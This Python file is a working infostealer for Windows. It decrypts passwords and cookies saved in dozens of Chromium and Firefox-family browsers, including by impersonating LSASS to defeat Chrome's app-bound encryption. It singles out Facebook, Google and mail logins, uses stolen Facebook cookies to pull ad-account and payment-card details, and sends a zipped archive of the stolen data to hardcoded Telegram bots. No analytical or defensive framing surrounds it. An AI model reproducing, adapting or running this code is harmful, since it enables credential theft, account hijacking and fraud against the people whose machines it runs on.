_y='Browsers Data'
_x='Profile*'
_w='c_user'
_v='document'
_u='ds_user_id'
_t='facebook.com'
_s='Cookies Browser'
_r='?mode=ro'
_q='encrypted_aes_key'
_p='cookie'
_o='E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660'
_n='B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787'
_m='app_bound_encrypted_key'
_l=b'\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
_k='Chrome SxS'
_j='Chrome (x86)'
_i='Chrome'
_h='windows_version'
_g='username'
_f='user_pc'
_e='AppData'
_d='-4675867333'
_c='-4644006719'
_b='instagram'
_a='Facebook_Cookies.txt'
_Z='name'
_Y='tag'
_X='ciphertext'
_W='Mercury'
_V='Waterfox'
_U='SeaMonkey'
_T='Pale Moon'
_S='Firefox'
_R='Local State'
_Q='country_code'
_P='city'
_O='region'
_N='USERPROFILE'
_M='Default'
_L='FALSE'
_K='TRUE'
_J=False
_I='os_crypt'
_H='iv'
_G='data'
_F=True
_E='w'
_D='flag'
_C='r'
_B=None
_A='utf-8'
import os,json,base64,sqlite3,shutil,requests,glob,re,zipfile,io,hmac,time,random,platform,binascii,sys,ctypes,struct,pathlib
from base64 import b64decode
from datetime import datetime
from hashlib import sha1,pbkdf2_hmac
from pathlib import Path
from pyasn1.codec.der.decoder import decode
from Crypto.Cipher import AES,DES3,ChaCha20_Poly1305
from win32crypt import CryptUnprotectData
from ctypes import windll,byref,create_unicode_buffer,pointer,WINFUNCTYPE
from ctypes.wintypes import DWORD,WCHAR,UINT
from smbprotocol.exceptions import SMBResponseException
from pypsexec.client import Client
import binascii
from contextlib import contextmanager
import windows,windows.security,windows.crypto,windows.generated_def as gdef
ImportantKeywords=['facebook','business',_b,'google','gmail',_b,'mail','hotmail','yahoo','live','outlook']
LocalAppData=os.getenv('LOCALAPPDATA')
AppData=os.getenv('APPDATA')
TMP=os.getenv('TEMP')
USR=TMP.split('\\AppData')[0]
PathBrowser=f"{TMP}\\Browsers Data"
user_profile=os.environ.get(_N)
count_ds_user_id=0
TOKEN_BOT_1='7433965944:AAEvoL2kEkFaglA8UPSLXBKf_A0lhi-oOxs'
CHAT_ID_NEW_1=_c
CHAT_ID_RESET_1=_c
TOKEN_BOT_2='7520995374:AAHV5sS_YzF3rpMs6aKTnl2ErTX0DxANoqw'
CHAT_ID_NEW_2=_d
CHAT_ID_RESET_2=_d
def id():
	A=os.path.join(os.environ[_N],_e,'Local','id.txt')
	if os.path.exists(A):
		with open(A,_C)as B:id=B.read()
	else:
		C=random.randint(10**14,10**15-1);id=str(C)
		with open(A,_E)as D:D.write(id)
	return id
def info():B=os.getenv('COMPUTERNAME');C=os.getlogin();D=platform.platform();A=requests.get('https://ipinfo.io').json();return{_f:B,_g:C,_h:D,_O:A[_O],_P:A[_P],'ip':A['ip'],_Q:A['country']}
info_=info()
def Counter():
	A=os.path.join(os.environ[_N],_e,'Local','number.txt')
	if os.path.exists(A):
		with open(A,_C)as C:B=int(C.read())+1
	else:B=1
	with open(A,_E)as D:D.write(str(B))
	return B
Count=Counter()
creation_datetime=datetime.now().strftime('%d-%m-%Y_%Hh%Mp%Ss')
ch_dc_browsers={'Chromium':f"{LocalAppData}\\Chromium\\User Data",'Thorium':f"{LocalAppData}\\Thorium\\User Data",_i:f"{LocalAppData}\\Google\\Chrome\\User Data",_j:f"{LocalAppData}\\Google(x86)\\Chrome\\User Data",_k:f"{LocalAppData}\\Google\\Chrome SxS\\User Data",'Maple':f"{LocalAppData}\\MapleStudio\\ChromePlus\\User Data",'Iridium':f"{LocalAppData}\\Iridium\\User Data",'7Star':f"{LocalAppData}\\7Star\\7Star\\User Data",'CentBrowser':f"{LocalAppData}\\CentBrowser\\User Data",'Chedot':f"{LocalAppData}\\Chedot\\User Data",'Vivaldi':f"{LocalAppData}\\Vivaldi\\User Data",'Kometa':f"{LocalAppData}\\Kometa\\User Data",'Elements':f"{LocalAppData}\\Elements Browser\\User Data",'Epic Privacy Browser':f"{LocalAppData}\\Epic Privacy Browser\\User Data",'Uran':f"{LocalAppData}\\uCozMedia\\Uran\\User Data",'Fenrir':f"{LocalAppData}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",'Catalina':f"{LocalAppData}\\CatalinaGroup\\Citrio\\User Data",'Coowon':f"{LocalAppData}\\Coowon\\Coowon\\User Data",'Liebao':f"{LocalAppData}\\liebao\\User Data",'QIP Surf':f"{LocalAppData}\\QIP Surf\\User Data",'Orbitum':f"{LocalAppData}\\Orbitum\\User Data",'Dragon':f"{LocalAppData}\\Comodo\\Dragon\\User Data",'360Browser':f"{LocalAppData}\\360Browser\\Browser\\User Data",'Maxthon':f"{LocalAppData}\\Maxthon3\\User Data",'K-Melon':f"{LocalAppData}\\K-Melon\\User Data",'Brave':f"{LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data",'Amigo':f"{LocalAppData}\\Amigo\\User Data",'Torch':f"{LocalAppData}\\Torch\\User Data",'Sputnik':f"{LocalAppData}\\Sputnik\\Sputnik\\User Data",'Edge':f"{LocalAppData}\\Microsoft\\Edge\\User Data",'DCBrowser':f"{LocalAppData}\\DCBrowser\\User Data",'Yandex':f"{LocalAppData}\\Yandex\\YandexBrowser\\User Data",'UR Browser':f"{LocalAppData}\\UR Browser\\User Data",'Slimjet':f"{LocalAppData}\\Slimjet\\User Data",'Opera':f"{AppData}\\Opera Software\\Opera Stable",'OperaGX':f"{AppData}\\Opera Software\\Opera GX Stable",'Speed360':f"{AppData}\\Local\\360chrome\\Chrome\\User Data",'QQBrowser':f"{AppData}\\Local\\Tencent\\QQBrowser\\User Data",'Sogou':f"{AppData}\\SogouExplorer\\Webkit",'Discord':f"{AppData}\\discord",'Discord Canary':f"{AppData}\\discordcanary",'Lightcord':f"{AppData}\\Lightcord",'Discord PTB':f"{AppData}\\discordptb"}
def taskkill():
	try:os.system('taskkill /F /IM chrome.exe /T >nul 2>&1');os.system('taskkill /F /IM msedge.exe /T >nul 2>&1');os.system('taskkill /F /IM brave.exe /T >nul 2>&1')
	except:pass
def installed_ch_dc_browsers():
	A=[]
	for(B,C)in ch_dc_browsers.items():
		if os.path.exists(C):A.append(B)
	return A
def get_ch_master_key(path):
	try:
		with open(os.path.join(path,_R),_C,encoding=_A)as C:B=C.read()
	except FileNotFoundError:return
	if _I not in B:return
	try:D=json.loads(B);A=base64.b64decode(D[_I]['encrypted_key']);A=A[5:];A=CryptUnprotectData(A,_B,_B,_B,0)[1];return A
	except:return
def decrypt_ch_value(buff,ch_master_key=_B):
	A=buff
	try:
		C=A.decode(encoding=_A,errors='ignore')[:3]
		if C=='v10'or C=='v11':D=A[3:15];E=A[15:];F=AES.new(ch_master_key,AES.MODE_GCM,D);B=F.decrypt(E);B=B[:-16].decode();return B
		else:0
	except(UnicodeDecodeError,ValueError,IndexError):return
	except Exception:return
def decrypt_aes(decoded_item,master_password,global_salt):A=decoded_item;C=A[0][0][1][0][1][0].asOctets();D=int(A[0][0][1][0][1][1]);B=int(A[0][0][1][0][1][2]);assert B==32;E=sha1(global_salt+master_password.encode(_A)).digest();F=pbkdf2_hmac('sha256',E,C,D,dklen=B);G=b'\x04\x0e'+A[0][0][1][1][1].asOctets();H=A[0][1].asOctets();I=AES.new(F,AES.MODE_CBC,G);return I.decrypt(H)
def decrypt3DES(globalSalt,masterPassword,entrySalt,encryptedData):A=entrySalt;E=sha1(globalSalt+masterPassword.encode()).digest();C=A+b'\x00'*(20-len(A));B=sha1(E+A).digest();F=hmac.new(B,C+A,sha1).digest();G=hmac.new(B,C,sha1).digest();H=hmac.new(B,G+A,sha1).digest();D=F+H;I=D[-8:];J=D[:24];return DES3.new(J,DES3.MODE_CBC,I).decrypt(encryptedData)
def getKey(directory,masterPassword=''):
	O='AES';N='3DES';F=masterPassword;P=directory+'\\key4.db';Q=sqlite3.connect(P);B=Q.cursor();B.execute('SELECT item1, item2 FROM metadata;');C=next(B);G,H=C
	try:D,R=decode(H);E=N;I=D[0][1][0].asOctets();J=D[1].asOctets()
	except AttributeError:E=O;D=decode(H)
	B.execute('SELECT a11, a102 FROM nssPrivate WHERE a102 = ?;',(_l,))
	try:C=next(B);K,S=C
	except StopIteration:raise Exception('gecko database broken')
	if E==O:A=decode(K);L=decrypt_aes(A,F,G)
	elif E==N:A,R=decode(K);M=A[0][0].asTuple();assert M==(1,2,840,113549,1,12,5,1,3),f"idk key to format {M}";I=A[0][1][0].asOctets();J=A[1].asOctets();L=decrypt3DES(G,F,I,J)
	return L[:24]
def PKCS7unpad(b):return b[:-b[-1]]
def decodeLoginData(key,data):A,E=decode(b64decode(data));assert A[0].asOctets()==_l;assert A[1][0].asTuple()==(1,2,840,113549,3,7);B=A[1][1].asOctets();C=A[2].asOctets();D=DES3.new(key,DES3.MODE_CBC,B);return PKCS7unpad(D.decrypt(C)).decode()
ERROR_SUCCESS=0
ERROR_MORE_DATA=234
RmForceShutdown=1
@WINFUNCTYPE(_B,UINT)
def callback(percent_complete):0
rstrtmgr=windll.LoadLibrary('Rstrtmgr')
def Unlock_Cookies(cookies_path):
	B=DWORD(0);D=DWORD(0);E=(WCHAR*256)();A=DWORD(rstrtmgr.RmStartSession(byref(B),D,E)).value
	if A!=ERROR_SUCCESS:raise RuntimeError(f"RmStartSession returned non-zero result: {A}")
	try:
		A=DWORD(rstrtmgr.RmRegisterResources(B,1,byref(pointer(create_unicode_buffer(cookies_path))),0,_B,0,_B)).value
		if A!=ERROR_SUCCESS:raise RuntimeError(f"RmRegisterResources returned non-zero result: {A}")
		C=DWORD(0);F=DWORD(0);G=DWORD(0);A=DWORD(rstrtmgr.RmGetList(B,byref(C),byref(F),_B,byref(G))).value
		if A not in(ERROR_SUCCESS,ERROR_MORE_DATA):raise RuntimeError(f"RmGetList returned non-successful result: {A}")
		if C.value:
			A=DWORD(rstrtmgr.RmShutdown(B,RmForceShutdown,callback)).value
			if A!=ERROR_SUCCESS:raise RuntimeError(f"RmShutdown returned non-successful result: {A}")
	finally:
		A=DWORD(rstrtmgr.RmEndSession(B)).value
		if A!=ERROR_SUCCESS:raise RuntimeError(f"RmEndSession returned non-successful result: {A}")
def save_gck_login_data(profiles,profile_name,browser_name):
	J='logins';G=browser_name;F=profile_name;B=0;H='';C=[]
	for D in profiles:
		try:
			with open(os.path.join(D,'logins.json'),_C)as K:I=json.load(K)
			if J not in I:return[]
			for E in I[J]:L=E['encryptedUsername'];M=E['encryptedPassword'];C.append((E['hostname'],decodeLoginData(getKey(D),L),decodeLoginData(getKey(D),M)))
			for A in C:H+=f"""URL: {A[0]}
Username: {A[1]}
Password: {A[2]}
Application: {G} [Profile: {F}]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""";B+=1
			for A in C:
				for N in ImportantKeywords:
					if N in A[0].lower():
						if not os.path.exists(PathBrowser):os.makedirs(PathBrowser)
						with open(f"{PathBrowser}\\Important_Logins.txt",'a',encoding=_A)as O:O.write(f"""URL: {A[0]}
Username: {A[1]}
Password: {A[2]}
Application: {G} [Profile: {F}]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
						break
		except:continue
	if B>0:
		if not os.path.exists(PathBrowser):os.makedirs(PathBrowser)
		P=os.path.join(PathBrowser,f"All_Passwords.txt")
		with open(P,'a',encoding=_A)as Q:Q.writelines(H)
	return B
def get_gck_basepath(browser_type):A={_S:f"{AppData}\\Mozilla\\Firefox",_T:f"{AppData}\\Moonchild Productions\\Pale Moon",_U:f"{AppData}\\Mozilla\\SeaMonkey",_V:f"{AppData}\\Waterfox",_W:f"{AppData}\\mercury",'K-Meleon':f"{AppData}\\K-Meleon",'IceDragon':f"{AppData}\\Comodo\\IceDragon",'Cyberfox':f"{AppData}\\8pecxstudios\\Cyberfox",'BlackHaw':f"{AppData}\\NETGATE Technologies\\BlackHaw"};return A.get(browser_type,_B)
def get_gck_profiles(basepath):
	A=basepath
	try:
		C=os.path.join(A,'profiles.ini')
		with open(C,_C)as D:E=D.read()
		B=[os.path.join(A.encode(_A),B.strip()[5:].encode(_A)).decode(_A)for B in re.findall('^Path=.+(?s:.)$',E,re.M)]
	except Exception:B=[]
	return B
def get_ch_login_data(browser,path,profile,key):
	H='password';E=browser;C=profile;I=os.path.join(path,C,'Login Data');J=fetch_passwords(I);K=[]
	if not os.path.exists(PathBrowser):os.makedirs(PathBrowser)
	F=0;G=''
	for A in J:
		B=decrypt_v20(A[2],key,H)
		if B:
			L={'origin_url':A[0],_g:A[1],H:B};K.append(L);G+=f"""URL: {A[0]}
Username: {A[1]}
Password: {B}
Application: {E} [Profile: {C}]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""";F+=1
			for M in ImportantKeywords:
				if M in A[0].lower():
					with open(os.path.join(PathBrowser,'Important_Logins.txt'),'a',encoding=_A)as D:D.write(f"""URL: {A[0]}
Username: {A[1]}
Password: {B}
Application: {E} [Profile: {C}]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
					break
	if F>0:
		with open(os.path.join(PathBrowser,'All_Passwords.txt'),'a',encoding=_A)as D:D.write(G)
def get_encryption_key(browser_path):
	'Retrieve and decrypt the Chrome encryption key.'
	if not user_profile:return
	D=D=os.path.join(browser_path,_R)
	try:
		with open(D,_C,encoding=_A)as I:J=json.load(I)
	except(FileNotFoundError,json.JSONDecodeError):return
	C=J.get(_I,{}).get(_m)
	if not C:return
	E='-c "'+"import win32crypt\nimport binascii\nencrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)\nprint(binascii.b2a_base64(encrypted_key[1]).decode())\n".replace('\n',';')+'"';A=Client('localhost')
	try:A.connect();A.create_service();time.sleep(2);assert binascii.a2b_base64(C)[:4]==b'APPB';K=binascii.b2a_base64(binascii.a2b_base64(C)[4:]).decode().strip();L,M,N=A.run_executable(sys.executable,arguments=E.format(K),use_system_account=_F);O,M,N=A.run_executable(sys.executable,arguments=E.format(L.decode().strip()),use_system_account=_J);B=binascii.a2b_base64(O)[-61:]
	except Exception:return
	finally:
		try:time.sleep(2);A.remove_service();time.sleep(1);A.disconnect()
		except Exception as U:
			try:time.sleep(5);A.remove_service();A.disconnect()
			except Exception:return
	P=bytes.fromhex(_n);Q=bytes.fromhex(_o);F=B[0];G=B[1:1+12];R=B[1+12:1+12+32];S=B[1+12+32:]
	try:
		if F==1:H=AES.new(P,AES.MODE_GCM,nonce=G)
		elif F==2:H=ChaCha20_Poly1305.new(key=Q,nonce=G)
		else:return
		T=H.decrypt_and_verify(R,S)
	except ValueError:return
	return T
def decrypt_v20(encrypted_value,key,data_type=_G):
	'Decrypt v20 encrypted data (cookie or password) using AES256GCM.';A=encrypted_value
	try:
		C=A[3:3+12];D=A[3+12:-16];E=A[-16:];F=AES.new(key,AES.MODE_GCM,nonce=C);B=F.decrypt_and_verify(D,E)
		if data_type==_p:return B[32:].decode(_A)
		return B.decode(_A)
	except ValueError:return
@contextmanager
def impersonate_lsass():
	'impersonate lsass.exe to get SYSTEM privilege';A=windows.current_thread.token
	try:windows.current_process.token.enable_privilege('SeDebugPrivilege');B=next(A for A in windows.system.processes if A.name=='lsass.exe');C=B.token;D=C.duplicate(type=gdef.TokenImpersonation,impersonation_level=gdef.SecurityImpersonation);windows.current_thread.token=D;yield
	finally:windows.current_thread.token=A
def parse_key_blob(blob_data):
	C=blob_data;B=io.BytesIO(C);A={};D=struct.unpack('<I',B.read(4))[0];A['header']=B.read(D);E=struct.unpack('<I',B.read(4))[0];assert D+E+8==len(C);A[_D]=B.read(1)[0]
	if A[_D]==1 or A[_D]==2:A[_H]=B.read(12);A[_X]=B.read(32);A[_Y]=B.read(16)
	elif A[_D]==3:A[_q]=B.read(32);A[_H]=B.read(12);A[_X]=B.read(32);A[_Y]=B.read(16)
	else:raise ValueError(f"Unsupported flag: {A[_D]}")
	return A
def decrypt_with_cng(input_data):G=input_data;B=ctypes.windll.NCRYPT;F=gdef.NCRYPT_PROV_HANDLE();I='Microsoft Software Key Storage Provider';A=B.NCryptOpenStorageProvider(ctypes.byref(F),I,0);assert A==0,f"NCryptOpenStorageProvider failed with status {A}";D=gdef.NCRYPT_KEY_HANDLE();J='Google Chromekey1';A=B.NCryptOpenKey(F,ctypes.byref(D),J,0,0);assert A==0,f"NCryptOpenKey failed with status {A}";C=gdef.DWORD(0);E=(ctypes.c_ubyte*len(G)).from_buffer_copy(G);A=B.NCryptDecrypt(D,E,len(E),_B,_B,0,ctypes.byref(C),64);assert A==0,f"1st NCryptDecrypt failed with status {A}";K=C.value;H=(ctypes.c_ubyte*C.value)();A=B.NCryptDecrypt(D,E,len(E),_B,H,K,ctypes.byref(C),64);assert A==0,f"2nd NCryptDecrypt failed with status {A}";B.NCryptFreeObject(D);B.NCryptFreeObject(F);return bytes(H[:C.value])
def byte_xor(ba1,ba2):return bytes([A^B for(A,B)in zip(ba1,ba2)])
def derive_v20_master_key(parsed_data):
	A=parsed_data
	if A[_D]==1:C=bytes.fromhex(_n);B=AES.new(C,AES.MODE_GCM,nonce=A[_H])
	elif A[_D]==2:D=bytes.fromhex(_o);B=ChaCha20_Poly1305.new(key=D,nonce=A[_H])
	elif A[_D]==3:
		E=bytes.fromhex('CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390')
		with impersonate_lsass():F=decrypt_with_cng(A[_q])
		G=byte_xor(F,E);B=AES.new(G,AES.MODE_GCM,nonce=A[_H])
	return B.decrypt_and_verify(A[_X],A[_Y])
def get_encryption_key_2(browser_path):
	'Retrieve and decrypt the Chrome encryption key.'
	if not user_profile:return
	B=B=os.path.join(browser_path,_R)
	try:
		with open(B,_C,encoding=_A)as C:D=json.load(C)
	except(FileNotFoundError,json.JSONDecodeError):return
	A=D.get(_I,{}).get(_m)
	if not A:return
	try:
		assert binascii.a2b_base64(A)[:4]==b'APPB';E=binascii.a2b_base64(A)[4:]
		with impersonate_lsass():F=windows.crypto.dpapi.unprotect(E)
		G=windows.crypto.dpapi.unprotect(F);H=parse_key_blob(G);I=derive_v20_master_key(H)
	except:return
	return I
def fetch_passwords(login_db_path):
	try:A=sqlite3.connect(pathlib.Path(login_db_path).as_uri()+_r,uri=_F);B=A.cursor();B.execute('SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;');C=B.fetchall();D=[A for A in C if A[2][:3]==b'v20'];A.close();return D
	except sqlite3.OperationalError:return[]
	except Exception:return[]
def get_ch_cookies(browser,path,profile,key):
	X='is_secure';W='expires_utc';V='path';U='value';T='host_key';S='Cookies';R='Network';I=browser;E=profile;C=path;Y=0;global count_ds_user_id;J=[];K=[];L='';M=f"{I}_{E}"
	if I in[_i,_k,_j,'Edge','Brave']:
		taskkill()
		if not os.path.exists(os.path.join(C,E,R,S)):return Y
		Z=os.path.join(C,E,R,S)
		try:
			N=sqlite3.connect(pathlib.Path(Z).as_uri()+_r,uri=_F);O=N.cursor()
			try:O.execute('SELECT host_key, name, CAST(encrypted_value AS BLOB), path, expires_utc, is_secure FROM cookies;')
			except:pass
			a=O.fetchall();b=[A for A in a if A[2][:3]==b'v20'];N.close()
			for A in b:
				P=decrypt_v20(A[2],key,_p)
				if P is not _B:K.append({T:A[0],_Z:A[1],U:P,V:A[3],W:int(A[4]/1000000-11644473600)if A[4]else int(time.time())+3600,X:bool(A[5])})
		except:pass
		F=os.path.join(PathBrowser,_s)
		if not os.path.exists(F):os.makedirs(F)
		c=os.path.join(F,M+'.txt')
		with open(c,_E,encoding=_A)as D:
			for B in K:
				G=B[T];d=_K if G.startswith('.')else _L;C=B[V];e=_K if B[X]else _L;f=B[W];H=B[_Z];Q=B[U];D.write(f"{G}\t{d}\t{C}\t{e}\t{f}\t{H}\t{Q}\n")
				if _t in G:J.append(f"{H}={Q}")
				if H==_u:count_ds_user_id+=1;L=' ***'
			g='; '.join(J)
		if not os.path.exists(PathBrowser):os.makedirs(PathBrowser)
		with open(os.path.join(PathBrowser,_a),'a',encoding=_A)as D:D.write(f"{M}{L}\n");D.write(f"{g}\n\n")
def save_gck_cookies(profiles,profile_name,browser_name):
	P='cookies.sqlite';H=browser_name;G=profile_name;F=profiles;A=0;I=[];global count_ds_user_id;J=[];K=''
	try:C=sqlite3.connect(f"file:{os.path.join(F[0],P)}?mode=ro",uri=_F);L=C.cursor()
	except sqlite3.Error:return A
	for Q in F:
		R=os.path.join(Q,P)
		if not os.path.isfile(R):continue
		try:L.execute('SELECT host, path, name, value, isSecure, isHttpOnly, expiry FROM moz_cookies');M=L.fetchall()
		except sqlite3.Error:continue
		if not M:continue
		for S in M:
			N,T,D,O,U,V,W=S;X=_K if U else _L;Y=_K if V else _L;I.append(f"{N}\t{X}\t{T}\t{Y}\t{W}\t{D}\t{O}\n")
			if N=='.facebook.com':J.append(f"{D}={O}")
			A+=1
			if D==_u:count_ds_user_id+=1;K=' ***'
		Z='; '.join(J)
		if not os.path.exists(PathBrowser):os.makedirs(PathBrowser)
		with open(os.path.join(PathBrowser,_a),'a',encoding=_A)as B:B.write(f"{H}_{G}{K}\n");B.write(f"{Z}\n\n")
	if A>0:
		E=os.path.join(PathBrowser,_s)
		if not os.path.exists(E):os.makedirs(E)
		a=os.path.join(E,f"{H}_{G}.txt")
		with open(a,_E,encoding=_A)as B:B.writelines(I)
	if C:C.close()
	return A
class Facebook2:
	def __init__(A,cookie):
		A.rq=requests.Session();B=A.Parse_Cookie(cookie);C={'authority':_t,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language':'en-US','cache-control':'max-age=0','sec-ch-prefers-color-scheme':'light','sec-ch-ua':'"Chromium";v="133", "Google Chrome";v="133", "Not:A-Brand";v="99"','sec-ch-ua-full-version-list':'"Chromium";v="133.0.6943.142", "Google Chrome";v="133.0.6943.142", "Not:A-Brand";v="99.0.0.0"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-ch-ua-platform-version':'"19.0.0"','sec-fetch-dest':_v,'sec-fetch-mode':'navigate','sec-fetch-site':'none','sec-fetch-user':'?1','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','viewport-width':'2005'};A.rq.headers.update(C);A.rq.cookies.update(B);A.token=A.Get_Market()
		if A.token==_J:return
		else:A.uid=B[_w]
	def Parse_Cookie(F,cookie):
		A={}
		for D in cookie.split(';'):
			B=D.strip().split('=',1)
			if len(B)==2:
				C,E=B
				if C.lower()in[_w,'xs','fr','sb','datr']:A[C]=E
		return A
	def Get_Market(B):
		try:C=B.rq.get('https://business.facebook.com/content_management');D=C.text;E=D.split('"adAccountID":"');F=E[1].split('"')[0];time.sleep(1);A=B.rq.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={F}&breakdown_regrouping=1&nav_source=no_referrer");A=A.text;G=A.split('window.__accessToken="');H=G[1].split('";')[0];time.sleep(1);return H
		except:return _J
	def Get_info_Tkqc(C):
		N='adtrust_dsl';F=C.rq.get(f"https://graph.facebook.com/v17.0/me/adaccounts?fields=account_id&access_token={C.token}");D='';G='';D+=f"Tổng Số TKQC: {str(len(F.json()[_G]))}\n"
		for O in F.json()[_G]:
			P=O['id'];time.sleep(1);A=C.rq.get(f"https://graph.facebook.com/v16.0/{P}/?fields=spend_cap,balance,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,created_time,all_payment_methods%7Bpm_credit_card%7Bdisplay_string%2Cis_verified%7D%7D&access_token={C.token}")
			try:H=A.json()['account_status']
			except:H='Không Rõ Trạng Thái'
			if int(H)==1:I='LIVE'
			else:I='DIE'
			try:
				J=A.json()['all_payment_methods']['pm_credit_card'][_G];Q=J[0]['display_string']
				if J[0]['is_verified']:K='Đã Xác Minh'
				else:K='No_Verified'
				L=f"{Q} - {K}"
			except:L='Không Thẻ'
			R=A.json()[_Z];S=A.json()['id'];B=A.json()['currency'];T=A.json()['balance'];U=A.json()['spend_cap'];V=A.json()['amount_spent']
			if A.json()[N]==-1:M='No Limit'
			else:M=A.json()[N]
			W=A.json()['created_time']
			try:E='{:.2f}'.format(float(A.json()['adspaymentcycle'][_G][0]['threshold_amount'])/100)
			except:E='0'
			D+=f"- Tên TKQC: {R}|ID_TKQC: {S}|Trạng Thái: {I}|Tiền Tệ: {B}|Số Dư: {T} {B}|Đã Tiêu Vào Ngưỡng: {U} {B}|Tổng Đã Chi Tiêu: {V} {B}|Limit Ngày: {M} {B}|Ngưỡng: {E} {B}|Thanh Toán: {L}|Ngày Tạo: {W[:10]}\n";G+=f"{E}{B}| "
		return D,G
	def ADS_Checker(B):
		try:A=B.Get_info_Tkqc();C=f"{A[0]}";D=A[1];return C,D
		except Exception:return'',''
gck_browser_profiles={_S:get_gck_profiles(get_gck_basepath(_S)),_T:get_gck_profiles(get_gck_basepath(_T)),_U:get_gck_profiles(get_gck_basepath(_U)),_V:get_gck_profiles(get_gck_basepath(_V)),_W:get_gck_profiles(get_gck_basepath(_W))}
available_path=installed_ch_dc_browsers()
for browser in available_path:
	browser_path=ch_dc_browsers[browser];taskkill();key_file_path=os.path.join(TMP,f"key_{browser.lower()}.txt")
	if os.path.exists(key_file_path):
		with open(key_file_path,_C,encoding=_A)as f:key=f.read().strip();key=bytes.fromhex(key)
	else:
		key=get_encryption_key_2(browser_path)
		if key is _B:key=get_encryption_key(browser_path)
		if key:
			if isinstance(key,bytes):key_to_save=key.hex()
			else:key_to_save=key
			with open(key_file_path,_E,encoding=_A)as f:f.write(key_to_save)
			key=bytes.fromhex(key_to_save)
	if key is _B:continue
	if not glob.glob(os.path.join(browser_path,_x)):profile_folders=[os.path.join(browser_path,_M)]
	else:profile_folders=[os.path.join(browser_path,_M)]+glob.glob(os.path.join(browser_path,_x))
	for profile_folder in profile_folders:profile=''if browser in['Opera','Opera GX']else os.path.basename(profile_folder);countP=get_ch_login_data(browser,browser_path,profile,key);countC=get_ch_cookies(browser,browser_path,profile,key)
for(browser,profiles)in gck_browser_profiles.items():
	for profile in profiles:profile_name=os.path.basename(profile);logins_count=save_gck_login_data([profile],profile_name,browser);cookies_count=save_gck_cookies([profile],profile_name,browser)
folders_to_archive=[]
files_to_archive=[]
for browser in available_path:
	browser_path=ch_dc_browsers[browser]
	for profile_dir in glob.glob(f"{browser_path}\\*"):
		if os.path.isdir(profile_dir):
			profile_name=os.path.basename(profile_dir)
			if profile_name==_M:profile_name_ext=_M
			else:profile_name_ext=f"{profile_name}"
path_cookies_fb=os.path.join(PathBrowser,_a)
try:
	count_c_user=0
	with open(path_cookies_fb,_C,encoding=_A)as f:lines=f.readlines()
	with open(path_cookies_fb,_E,encoding=_A)as f:
		for line in lines:
			f.write(line)
			if'c_user='in line:count_c_user+=1;cookie=line.strip()
except:pass
zip_data=io.BytesIO()
archive_path=os.path.join(TMP,f"{info_[_Q]} {id()} {creation_datetime}.zip")
with zipfile.ZipFile(zip_data,mode=_E,compression=zipfile.ZIP_DEFLATED,compresslevel=9)as zip_file:
	zip_file.comment=f"Time Created: {creation_datetime}\nBot Telegram".encode(_A)
	for(root,dirs,files)in os.walk(PathBrowser):
		for file in files:
			file_path=os.path.join(root,file);relative_path=os.path.relpath(file_path,PathBrowser);archive_file_path=os.path.join(_y,relative_path)
			try:zip_file.write(file_path,archive_file_path)
			except:continue
		for dir in dirs:
			dir_path=os.path.join(root,dir);relative_path=os.path.relpath(dir_path,PathBrowser);archive_dir_path=os.path.join(_y,relative_path)
			try:zip_file.write(dir_path,archive_dir_path)
			except:continue
	for(folder_path,archive_sub_path)in folders_to_archive:
		excluded_dirs=[]
		for dir_name in os.listdir(folder_path):
			if dir_name.startswith('user_data'):excluded_dirs.append(dir_name)
		dirs_to_exclude=set(excluded_dirs)
		for(root,dirs,files)in os.walk(folder_path):
			for file in files:
				file_path=os.path.join(root,file)
				if os.path.isfile(file_path)and'.zip'not in file:
					relative_path=os.path.relpath(file_path,folder_path);archive_file_path=os.path.join(archive_sub_path,relative_path)
					try:zip_file.write(file_path,archive_file_path)
					except:continue
			for dir in dirs:
				dir_path=os.path.join(root,dir)
				if os.path.isdir(dir_path):
					relative_path=os.path.relpath(dir_path,folder_path);archive_dir_path=os.path.join(archive_sub_path,relative_path)
					try:zip_file.write(dir_path,archive_dir_path)
					except:continue
	for(file_path,archive_sub_path,file_renamed)in files_to_archive:
		archive_file_path=os.path.join(archive_sub_path,file_renamed)
		try:zip_file.write(file_path,archive_file_path)
		except:continue
with open(archive_path,'wb')as f:f.write(zip_data.getbuffer())
message_body=f"""country :  {info_[_P]}-{info_[_O]}-{info_[_Q]}
ID : {id()}
{info_[_h]}
Username: {info_[_f]} {os.getlogin()}
CK: {count_c_user} | Card: {count_ds_user_id}
{Count}
IP-Sever:21411914119"""
bots=[(TOKEN_BOT_1,CHAT_ID_NEW_1 if Count==1 else CHAT_ID_RESET_1),(TOKEN_BOT_2,CHAT_ID_NEW_2 if Count==1 else CHAT_ID_RESET_2)]
for(token,chat_id)in bots:
	success=_J
	for attempt in range(10):
		try:
			with open(archive_path,'rb')as f:response=requests.post(f"https://api.telegram.org/bot{token}/sendDocument",params={'chat_id':chat_id,'caption':message_body,'disable_web_page_preview':_F},files={_v:f});response.raise_for_status()
			success=_F;break
		except Exception as e:
			if attempt==9:print(f"Error sending to {chat_id}: {e}")
			continue
